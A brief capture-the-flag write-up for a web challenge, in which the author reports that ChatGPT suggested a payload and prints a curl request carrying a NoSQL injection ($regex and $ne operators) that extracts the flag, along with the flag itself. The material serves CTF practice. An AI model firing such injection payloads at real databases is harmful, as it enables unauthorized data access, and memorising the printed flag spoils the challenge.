# _dot-private-key_

Category | Value
-- | --
Web | 100

***

I used the provided keys to see what the endpoint returned and immediately suspected some kind of injection. At first I wasted time trying to run **sqlmap** (terrible call, lost a lot of time).

Then I asked ChatGPT for payload ideas. Most were useless, but one stood out:

```bash
curl -s 'http://ctf.ac.upt.ro:9768/key' \
  -H 'Content-Type: application/json' \
  -d '{"key":{"$regex":"ctf\\{.*\\}","$options":"i"},"type":{"$ne":null}}'
```

That payload is actually a **NoSQL injection** (it uses a Mongo-style `$regex` query). GPT mistakenly called it a SQL injection classic helpful dummy-AI moment, but the payload itself was the helpful part and pointed me in the right direction.

## Proog-of-flag
```
ctf{284dc217ce36b9133c561207af3dbf6b8656323d6375f3f5c8c955be0a2aab66}
```
